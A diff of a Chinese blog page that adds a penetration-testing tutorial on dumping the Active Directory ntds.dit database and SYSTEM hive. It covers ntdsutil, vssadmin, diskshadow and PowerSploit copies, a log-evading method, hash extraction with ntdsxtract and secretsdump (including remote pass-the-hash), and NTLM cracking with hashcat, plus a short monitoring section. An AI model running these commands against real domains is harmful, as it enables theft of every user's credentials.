@@ -8,8 +8,8 @@
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="域控安全前言：博客的所有文章只是自己学习的过程，参考各大佬的文章来学习，还有自己的理解，知识点比较浅，见谅
-">
+    <meta name="description" content="域控安全之ntds.dit导出🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍
+在通常的情况下,即使我们拥有域管理员的权限也是无法读取域控制器的C:\Windows\NTDS\ntds.dit文件,是因为活动目录始终访">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -197,10 +197,10 @@
     };
     loaded();
 })()
- </script>
+ </script><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><style type="text/css" lang="css">
+<style type="text/css" lang="css">
     #loading-container{
         position: fixed;
         top: 0;
@@ -509,7 +509,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -629,11 +629,24 @@
                 <div class="col s7">
                     
                     <div class="article-tag">
-                        <span class="chip bg-color">无标签</span>
+                        
+                        <a href="/tags/内网渗透/" target="_blank">
+                            <span class="chip bg-color">内网渗透</span>
+                        </a>
+                        
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                        <a href="/categories/内网渗透/" class="post-category" target="_blank">
+                            内网渗透
+                        </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -655,14 +668,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    48
+                    4.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    16 分
                 </div>
                 
                 
@@ -673,7 +686,263 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="域控安全"><a href="#域控安全" class="headerlink" title="域控安全"></a>域控安全</h1><p>前言：博客的所有文章只是自己学习的过程，参考各大佬的文章来学习，还有自己的理解，知识点比较浅，见谅</p>
+                <h1 id="域控安全之ntds-dit导出"><a href="#域控安全之ntds-dit导出" class="headerlink" title="域控安全之ntds.dit导出"></a>域控安全之ntds.dit导出</h1><p>🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍</p>
+<p>在通常的情况下,即使我们拥有域管理员的权限也是无法读取域控制器的C:\Windows\NTDS\ntds.dit文件,是因为活动目录始终访问着这个文件,所以禁止读取.使用windows的本地卷影拷贝就可以获得文件的副本</p>
+<p>什么是卷影拷贝：卷影拷贝服务（Volume Shadow Copy Service，VSS）是<a href="https://baike.baidu.com/item/Microsoft" target="_blank" rel="noopener">Microsoft</a>在Windows XP中开始引入的服务，但到了[Windows Server 2003](<a href="https://baike.baidu.com/item/Windows" target="_blank" rel="noopener">https://baike.baidu.com/item/Windows</a> Server 2003)作为一个备份服务器功能独立出来，它能让用户在没有IT专业人员协助的情况下，更轻松地恢复丢失的文件。</p>
+<h2 id="Ntds-dit"><a href="#Ntds-dit" class="headerlink" title="Ntds.dit"></a>Ntds.dit</h2><p>什么是ntds.dit</p>
+<blockquote>
+<p>在活动目录中,所有的数据都保存在ntds.dit中,ntds.dit是一个二进制文件，存储位置为域控制器的%SystemRoot%\ntds\ntds.dit。ntds.dit中包含（但不限于）用户名、散列值、组、GPP、OU等与活动目录相关的信息。而在非域环境也就是在工作组环境中，用户的密码等信息存储在SAM文件，想要破解SAM文件与Ntds.dit文件都需要拥有一个System文件。它和sam一样，是被Windows操作系统锁定的</p>
+</blockquote>
+<p>如何利用:</p>
+<blockquote>
+<p>在一般的情况下,系统的运维人员会利用卷影拷贝服务实验这些操作. VSS本质上属于快照技术的一种,主要用于备份和恢复(即使目标处于锁定的状态)</p>
+</blockquote>
+<p>位置</p>
+<pre><code>ntds.dit文件位置: `C:\Windows\NTDS\NTDS.dit`
+ system文件位置:`C:\Windows\System32\config\SYSTEM`
+ sam文件位置:`C:\Windows\System32\config\SAM`
+
+ ntds.dit一般存储域用户的信息，sam是本机的，然后system里面存放了密钥，如果sam,ntds.dit要破解就需要system</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017210302515.png" alt="image-20211017210302515"></p>
+<h1 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h1><h2 id="通过ntdsutil-exe-提取-ntds-dit"><a href="#通过ntdsutil-exe-提取-ntds-dit" class="headerlink" title="通过ntdsutil.exe 提取 ntds.dit"></a>通过ntdsutil.exe 提取 ntds.dit</h2><p>ntdsutil.exe是一个位活动目录(AD)提供管理机制的命令行工具。该工具默认安装在了域控制器上面,可以在域控制器上面直接操作,也可以通过域内机器在域控制器上远程操作.</p>
+<p>支持的系统：windows server 2003 ，windows server 2008， windows server 2012。</p>
+<h3 id="1-创建一个快照"><a href="#1-创建一个快照" class="headerlink" title="1.创建一个快照"></a>1.创建一个快照</h3><pre><code>ntdsutil snapshot "activate instance ntds" create quit quit</code></pre><p>该快照包含Windows中的所有文件，且在复制时不会受到Windows锁定机制的影响，需要<strong><em>管理员权限</em></strong>去执行</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015171201418.png" alt="image-20211015171201418"></p>
+<p>可以看到这边创建了一个GUID{06a1b343-93f9-4c1b-a613-d02c23f99759}</p>
+<h3 id="2-加载快照"><a href="#2-加载快照" class="headerlink" title="2.加载快照"></a>2.加载快照</h3><pre><code>ntdsutil snapshot "mount {06a1b343-93f9-4c1b-a613-d02c23f99759}" quit quit   //这个后面的就是刚创建的ID</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015171607389.png" alt="image-20211015171607389"></p>
+<p>可以看到快照已经加载到了</p>
+<pre><code>路径： C:\$SNAP_202110151711_VOLUMEC$\</code></pre><p>查看一下</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015171816728.png" alt="image-20211015171816728"></p>
+<p>确实存在了</p>
+<h3 id="3-拷贝快照"><a href="#3-拷贝快照" class="headerlink" title="3.拷贝快照"></a>3.拷贝快照</h3><pre><code>copy C:\$SNAP_202110151711_VOLUMEC$\windows\ntds\ntds.dit c:\windows\temp\ntds.dit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015172046097.png" alt="image-20211015172046097"></p>
+<h3 id="4-卸载删除快照"><a href="#4-卸载删除快照" class="headerlink" title="4.卸载删除快照"></a>4.卸载删除快照</h3><pre><code>ntdsutil snapshot "unmount {06a1b343-93f9-4c1b-a613-d02c23f99759}" "delete {06a1b343-93f9-4c1b-a613-d02c23f99759}" quit quit
+ntdsutil snapshot "mount &lt;ID&gt;" "delete &lt;ID&gt;" quit quit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015172756816.png" alt="image-20211015172756816"></p>
+<h3 id="5-查看一下快照"><a href="#5-查看一下快照" class="headerlink" title="5.查看一下快照"></a>5.查看一下快照</h3><pre><code>ntdsutil snapshot "List All" quit quit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015173520407.png" alt="image-20211015173520407"></p>
+<h2 id="使用-ntdsutil-的-IFM卷影拷贝提取Ntds-dit文件"><a href="#使用-ntdsutil-的-IFM卷影拷贝提取Ntds-dit文件" class="headerlink" title="使用 ntdsutil 的 IFM卷影拷贝提取Ntds.dit文件"></a>使用 ntdsutil 的 IFM卷影拷贝提取Ntds.dit文件</h2><p>通过上一个命令执行来实现创建快照，加载，拷贝，最后提去出来ntds.dit       同时也可以通过创建一个IFM，在使用ntdsutil创建IFM时，需要进行生成快照、加载、将{% label info@ntds.dit 和计算机的SAM文件复制到目标文件夹中等 %}操作</p>
+<h3 id="1-执行创建IFM"><a href="#1-执行创建IFM" class="headerlink" title="1.执行创建IFM"></a>1.执行创建IFM</h3><p>在<strong>域控制器</strong>中执行如下命令即可（需要域管理员权限，没有的会让其弹出UAC）：</p>
+<pre><code>ntdsutil "ac i ntds" "ifm" "create full c:/test" q q </code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017192759465.png" alt="image-20211017192759465"></p>
+<p>然后就会在c盘下的/test/Active Directory  会出现ntds.dit</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017192909004.png" alt="image-20211017192909004"></p>
+<p>同时test/registry也会出现system security文件</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017193004852.png" alt="image-20211017193004852"></p>
+<h3 id="2-移动ntds-dit文件"><a href="#2-移动ntds-dit文件" class="headerlink" title="2.移动ntds.dit文件"></a>2.移动ntds.dit文件</h3><pre><code>copy "c:\test\Active Directory\ntds.dit" c:\</code></pre><p><img src="/images/loading.gif" data-original="C:%5CUsers%5C77960%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211017193606706.png" alt="image-20211017193606706"></p>
+<h3 id="Copy-VSS-ps1"><a href="#Copy-VSS-ps1" class="headerlink" title="Copy-VSS.ps1"></a>Copy-VSS.ps1</h3><p>或者可以导入nishang中的Copy-VSS.ps1</p>
+<pre><code>Import-Module .\Copy-VSS.ps1
+
+Copy-VSS
+或者指定目录
+Copy-VSS -DestinationDir C:\</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017194014368.png" alt="image-20211017194014368"></p>
+<p>这个脚本直接就在当前目录生成了。</p>
+<h3 id="PowerSploit中的Invoke-NinjaCopy脚本"><a href="#PowerSploit中的Invoke-NinjaCopy脚本" class="headerlink" title="PowerSploit中的Invoke-NinjaCopy脚本"></a>PowerSploit中的Invoke-NinjaCopy脚本</h3><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1" target="_blank" rel="noopener">下载地址</a></p>
+<p>复制一些系统无法复制的文件，如sam文件( 管理员权限 )</p>
+<p>命令使用</p>
+<pre><code>Invoke-NinjaCopy -Path &lt;需要复制的文件&gt; -LocalDestination &lt;复制文件保存位置&gt;</code></pre><p>现在尝试复制出来ntds.dit ,system文件</p>
+<pre><code>Import-Module .\Invoke-NinjaCopy.ps1
+Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\ntds.dit"
+Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "C:\system.hive"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017213203032.png" alt="image-20211017213203032"></p>
+<p><strong>这种方法没有调用Volume Shadow Copy服务，所以不会产生日志文件7036(卷影拷贝服务进入运行状态的标志)。</strong></p>
+<h2 id="通过vssadmin提取ntds-dit"><a href="#通过vssadmin提取ntds-dit" class="headerlink" title="通过vssadmin提取ntds.dit"></a>通过vssadmin提取ntds.dit</h2><p>vssadminn是Windows Server 2008及 Windows 7提供的VSS管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息（只能管理系统Provider 创建的卷影拷贝)、显示已安装的所有卷影拷贝写入程序( writers )和提供程序( providers )，以及改变卷影拷贝的存储空间(即所谓的“diff空间”)的大小等</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015174443626.png" alt="image-20211015174443626"></p>
+<p>操作vssadmin需要<strong><u>域管理员权限</u></strong>了</p>
+<h3 id="1-创建一个C盘的卷影拷贝"><a href="#1-创建一个C盘的卷影拷贝" class="headerlink" title="1.创建一个C盘的卷影拷贝"></a>1.创建一个C盘的卷影拷贝</h3><pre><code>vssadmin create shadow /for=c:</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015174856686.png" alt="image-20211015174856686"></p>
+<h3 id="2-将创建的卷影拷贝中的ntds-dit复制出来到c盘"><a href="#2-将创建的卷影拷贝中的ntds-dit复制出来到c盘" class="headerlink" title="2.将创建的卷影拷贝中的ntds.dit复制出来到c盘"></a>2.将创建的卷影拷贝中的ntds.dit复制出来到c盘</h3><pre><code>copy 卷影副本卷名\windows\ntds\ntds.dit c:\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\ntds\ntds.dit c:\ntds.dit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015175126153.png" alt="image-20211015175126153"></p>
+<h3 id="3-删除卷影"><a href="#3-删除卷影" class="headerlink" title="3.删除卷影"></a>3.删除卷影</h3><pre><code>vssadmin delete shadows /for=c: /quiet</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015175155805.png" alt="image-20211015175155805"></p>
+<h3 id="拓展访问快照中的文件"><a href="#拓展访问快照中的文件" class="headerlink" title="拓展访问快照中的文件"></a>拓展<strong>访问快照中的文件</strong></h3><p><strong>访问快照中的文件</strong></p>
+<pre><code>vssadmin list shadows  //查看快照
+
+当我们无法直接访问\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5中的文件</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017215202260.png" alt="image-20211017215202260"></p>
+<p>可通过创建符号链接访问快照中的文件：</p>
+<pre><code>mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017215457026.png" alt="image-20211017215457026"></p>
+<p>删除符号链接：</p>
+<pre><code>rd c:\testvsc</code></pre><p>利用思路：</p>
+<p>如果当前系统存在快照文件，可对系统的历史文件进行访问。</p>
+<h2 id="通过vssown-vbs脚本"><a href="#通过vssown-vbs脚本" class="headerlink" title="通过vssown.vbs脚本"></a>通过vssown.vbs脚本</h2><p>vssown.vbs脚本的功能和vssadmin类似。vssown.vbs脚本是由Tim Tomes 开发的，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务。</p>
+<p>脚本下载：<a href="https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs" target="_blank" rel="noopener">https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs</a></p>
+<p><strong><u>需要域管理员权限操作</u></strong></p>
+<h3 id="1-启动卷影拷贝服务"><a href="#1-启动卷影拷贝服务" class="headerlink" title="1.启动卷影拷贝服务"></a>1.启动卷影拷贝服务</h3><pre><code>cscript vssown.vbs /start</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015180036057.png" alt="image-20211015180036057"></p>
+<p>cscript命令专用于执行要在命令行环境中运行的脚本</p>
+<h3 id="2-创建一个C盘的卷影拷贝"><a href="#2-创建一个C盘的卷影拷贝" class="headerlink" title="2.创建一个C盘的卷影拷贝"></a>2.创建一个C盘的卷影拷贝</h3><pre><code>cscript vssown.vbs /create c</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015180153831.png" alt="image-20211015180153831"></p>
+<p>执行命令列出当前已经创建的卷影拷贝：</p>
+<pre><code>cscript vssown.vbs /list</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015180349109.png" alt="image-20211015180349109"></p>
+<p>主要关注ID和Device object，这是把ntds.dit复制出来和删除的关键</p>
+<pre><code>ID:{DF222F60-F8F3-459E-ABF9-399519FAD8B4}
+存储位置：\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5</code></pre><h3 id="3-在创建的卷影拷贝中将ntds-dit复制到C盘中"><a href="#3-在创建的卷影拷贝中将ntds-dit复制到C盘中" class="headerlink" title="3.在创建的卷影拷贝中将ntds.dit复制到C盘中"></a>3.在创建的卷影拷贝中将ntds.dit复制到C盘中</h3><pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit C:\ntds.dit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015180633940.png" alt="image-20211015180633940"></p>
+<h3 id="4-得到Ntds-dit的副本之后，将刚刚创建的卷影拷贝删除"><a href="#4-得到Ntds-dit的副本之后，将刚刚创建的卷影拷贝删除" class="headerlink" title="4.得到Ntds.dit的副本之后，将刚刚创建的卷影拷贝删除"></a>4.得到Ntds.dit的副本之后，将刚刚创建的卷影拷贝删除</h3><pre><code>cscript vssown.vbs /delete {DF222F60-F8F3-459E-ABF9-399519FAD8B4}</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015180741463.png" alt="image-20211015180741463"></p>
+<h2 id="使用diskshadow导出ntds-dit"><a href="#使用diskshadow导出ntds-dit" class="headerlink" title="使用diskshadow导出ntds.dit"></a>使用diskshadow导出ntds.dit</h2><p>diskshadow.exe这款工具可以使用卷影拷贝服务（VSS)所提供的多个功能。在默认配置下，diskshadow.exe使用了一种交互式命令解释器，<u><strong><em>Windows Server 2008</em></strong></u>、<strong><em><u>Windows Server 2012</u></em></strong>和 <strong><em><u>Windows Server 2016</u></em></strong>都默认包含diskshadow，所以，diskshadow 也可以用来操作卷影拷贝服务并导出ntds.dit，diskshadow的功能与vshadow类似，且同样位于C:\windows\system32\ 目录下。</p>
+<p>diskshadow有交互和非交互两种模式。在使用交互模式时，需要登录远程桌面的图形化管理界面。不论是交互模式还是非交互模式，都可以使用exec调取一个脚本文件来执行相关命令，还可以使用 diskshadow.exe 来执行计算器。</p>
+<h3 id="diskshadow-exe-来执行计算器"><a href="#diskshadow-exe-来执行计算器" class="headerlink" title="diskshadow.exe 来执行计算器"></a>diskshadow.exe 来执行计算器</h3><h4 id="1、通过echo创建文件"><a href="#1、通过echo创建文件" class="headerlink" title="1、通过echo创建文件"></a>1、通过echo创建文件</h4><pre><code>echo exec c:\windows\system32\calc.exe &gt; c:\users\liukaifeng01\Desktop\cmd.txt</code></pre><p>把执行计算机的命令写进去</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017195405153.png" alt="image-20211017195405153"></p>
+<h4 id="2-使用diskshadow-exe执行创建的文件"><a href="#2-使用diskshadow-exe执行创建的文件" class="headerlink" title="2.使用diskshadow.exe执行创建的文件"></a>2.使用diskshadow.exe执行创建的文件</h4><pre><code>diskshadow.exe /s c:\command.txt</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017204814858.png" alt="image-20211017204814858"></p>
+<h3 id="diskshadow-exe-导出ntds-dit"><a href="#diskshadow-exe-导出ntds-dit" class="headerlink" title="diskshadow.exe 导出ntds.dit"></a>diskshadow.exe 导出ntds.dit</h3><p>将一下命令复制到一个txt文件里面</p>
+<pre><code>#设置卷影拷贝
+set context persistent nowriters
+#添加卷
+add volume c: alias someAlias
+#创建快照
+create
+#分配虚拟磁盘盘符
+expose %someAlias% k:
+#复制ntds.dit到C:\ntds.dit
+exec "cmd.exe" /c copy k:\windows\ntds\ntds.dit c:\ntds.dit
+#删除所有快照
+delete shadows all
+#列出系统中的卷影拷贝
+list shadows all
+#重置
+reset
+#退出
+exit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017205814593.png" alt="image-20211017205814593"></p>
+<p>diskshadow.exe 导出ntds.dit的时候最好把路径选择在system32去执行，不然会报错</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017205857375.png" alt="image-20211017205857375"></p>
+<h2 id="监控卷影拷贝服务的使用情况"><a href="#监控卷影拷贝服务的使用情况" class="headerlink" title="监控卷影拷贝服务的使用情况"></a><strong>监控卷影拷贝服务的使用情况</strong></h2><p>通过监控卷影拷贝服务的使用情况，可以及时发现攻击者在系统中进行的一些恶意操作。</p>
+<ul>
+<li>监控卷影拷贝服务及任何涉及活动目录数据库文件(ntds.dit)的可疑操作行为。</li>
+<li>监控 System Event ID 7036(卷影拷贝服务进行运行状态的标志)的可疑事例，以及创建 vssvc.exe 进程的事件。</li>
+<li>监控创建 diskshadow.exe 及相关子进程的事件。</li>
+<li>监控客户端设备中的 diskshadow.exe 实例创建事件。除非业务需要，在Windows操作系统中不应该出现 diskshadow.exe。如果发现，应立刻将其删除。</li>
+<li>通过日志监控新出现的逻辑驱动器映射事件。</li>
+</ul>
+<p>调用Volume Shadow Copy（卷影拷贝）服务会产生日志文件，位于System下，Event ID为7036</p>
+<p>注意在执行ntdsutil的时候事件日志会产生Event ID为98的日志文件</p>
+<pre><code>ntdsutil snapshot "activate instance ntds" create quit quit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017214752494.png" alt="image-20211017214752494"></p>
+<h1 id="导出SYSTEM文件"><a href="#导出SYSTEM文件" class="headerlink" title="导出SYSTEM文件"></a><strong>导出SYSTEM文件</strong></h1><p>在我们前面导出ntds.dit之后我们还需要导出system的文件，将system.hive转储，因为system.hive中存放着ntds.dit的密钥。</p>
+<p>在前面的方法中已经有了copy-vss还有PowerSploit中的Invoke-NinjaCopy的方法</p>
+<h3 id="1-通过注册表的方式导出"><a href="#1-通过注册表的方式导出" class="headerlink" title="1.通过注册表的方式导出"></a>1.通过注册表的方式导出</h3><pre><code>reg save hklm\system c:\system.hive</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018104811278.png" alt="image-20211018104811278"></p>
+<h3 id="2-copy-VSS"><a href="#2-copy-VSS" class="headerlink" title="2.copy-VSS"></a>2.copy-VSS</h3><p>详细见上面</p>
+<h3 id="3-invoke-ninjacopy"><a href="#3-invoke-ninjacopy" class="headerlink" title="3.invoke-ninjacopy"></a>3.invoke-ninjacopy</h3><p>详细见上面</p>
+<h1 id="导出ntds-dit的散列值"><a href="#导出ntds-dit的散列值" class="headerlink" title="导出ntds.dit的散列值"></a>导出ntds.dit的散列值</h1><p>取出了ntds.dit，但是不去导出散列值那么获取了也是没有意义。</p>
+<h2 id="Esedbexport"><a href="#Esedbexport" class="headerlink" title="Esedbexport"></a>Esedbexport</h2><h3 id="1-利用Esedbexport恢复ntds-dit并导出用户表信息"><a href="#1-利用Esedbexport恢复ntds-dit并导出用户表信息" class="headerlink" title="1.利用Esedbexport恢复ntds.dit并导出用户表信息"></a>1.利用Esedbexport恢复ntds.dit并导出用户表信息</h3><p>利用这个工具的目的就是从目标系统中导出ntds.dit放到本地中去解析</p>
+<p>首先下载链接：<a href="https://github.com/libyal/libesedb/releases/tag/20210424" target="_blank" rel="noopener">https://github.com/libyal/libesedb/releases/tag/20210424</a></p>
+<pre><code>apt-get install autoconf automake autopoint libtool pkg-config  //安装依赖环境
+剩下的都是编译下载安装
+wget https://github.com/libyal/libesedb/releases/tag/20210424/libesedb-experimental-20210424.tar.gz
+
+cd libesedb-experimental-20210424
+./configure
+make &amp;&amp; make install &amp;&amp; ldconfig</code></pre><p>安装成功后就会在以下目录看到存在</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018110739456.png" alt="image-20211018110739456"></p>
+<p>然后我们进入存档ntds.dit的目录，使用esedbexport进行恢复操作</p>
+<pre><code>esedbexport -m tables ntds.dit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018111031854.png" alt="image-20211018111031854"></p>
+<p>如果提取成功的话，会在当前目录下生成一个ntds.dit.export文件夹。</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018111121336.png" alt="image-20211018111121336"></p>
+<p>只需要其中的datatable.3和link_table.5即可</p>
+<h3 id="2-导出域散列值"><a href="#2-导出域散列值" class="headerlink" title="2.导出域散列值"></a>2.导出域散列值</h3><p>这边利用的是ntdsxtract工具去导出，该工具不仅能够提取与用户对象、组对象、计算机对象相关的信息，同时还能从NTDS.dit文件中删除对象。</p>
+<pre><code>git clone https://github.com/csababarta/ntdsxtract.git</code></pre><p>继续输入如下命令，安装ntdsxtract。</p>
+<pre><code>python setup.py build &amp;&amp; python setup.py install</code></pre><p>将导出的datatable.3、link_table.5这两个表和之前获得的SYSTEM文件一并放入ntdsxtract的文件夹中</p>
+<p>输入如下命令。</p>
+<pre><code>dsusers.py &lt;datatable&gt; &lt;link_table&gt; &lt;output_dir&gt; --syshive &lt;systemhive&gt; --passwordhashes &lt;format options&gt;      // 命令格式
+
+python dsusers.py datatable.3 link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt   //注意大小写，我复制进去的SYSTEM是大写的</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018112258171.png" alt="image-20211018112258171"></p>
+<p>或者导出csv格式也可以，还具有一个“dscomputers.py”工具可以从分离出来的表中提取域中计算机信息</p>
+<pre><code>python dscomputers.py ntds.dit.export/datatable.3 computer_output --csvoutfile result.csv</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018114506209.png" alt="image-20211018114506209"></p>
+<p>当然有了散列值之后那么获取密码就可以通过破解去，常见mimikatz获取明文密码，ophcrack在线破解，hashcat等</p>
+<p>就拿ntlm hash来举例子去破解</p>
+<pre><code>liukaifeng01:afffeba176210fad4628f0524bfe1942  //这是刚才导出的hash值</code></pre><p>打开hashcat</p>
+<pre><code>hashcat -m 1000 afffeba176210fad4628f0524bfe1942 3.txt --force  //-m 就是ntlm hash的破解参数</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018113859905.png" alt="image-20211018113859905"></p>
+<p>成功破解出来</p>
+<h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><h3 id="1-使用Impacket中的secretsdump"><a href="#1-使用Impacket中的secretsdump" class="headerlink" title="1.使用Impacket中的secretsdump"></a>1.使用Impacket中的secretsdump</h3><p>secretsdump.py有一个本地选项，可以解析Ntds.dit文件并从Ntds.dit中提取哈希散列值和域信息。在此之前，我们必须获取到<strong><u>Ntds.dit和SYSTEM</u></strong>这两个文件。如果条件满足，你可以执行以下命令：</p>
+<pre><code>python2 secretsdump.py -system system -ntds ntds.dit LOCAL</code></pre><p>首先下载impacket工具包</p>
+<pre><code>git clone https://github.com/SecureAuthCorp/impacket.git</code></pre><p>然后安装</p>
+<pre><code>python setup.py install</code></pre><p>开始提取</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018115225265.png" alt="image-20211018115225265"></p>
+<p>也可以直接通过用户名和散列值进行验证，从远程域控制器中读取ntds.dit并转储域散列值，命令如下。</p>
+<pre><code>python2 secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942 -just-dc god.org/liukaifeng01r@x.x.x.x</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018125628020.png" alt="image-20211018125628020"></p>
+<h2 id="在线提取Ntds-dit中的哈希"><a href="#在线提取Ntds-dit中的哈希" class="headerlink" title="在线提取Ntds.dit中的哈希"></a>在线提取Ntds.dit中的哈希</h2><h3 id="1-利用dcsync获取域散列值"><a href="#1-利用dcsync获取域散列值" class="headerlink" title="1.利用dcsync获取域散列值"></a>1.<strong>利用dcsync获取域散列值</strong></h3><p>DCSync是Mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，其能够利用卷影拷贝服务直接读取ndts.dit并导出域内所有用户的哈希值。需要管理员权限.</p>
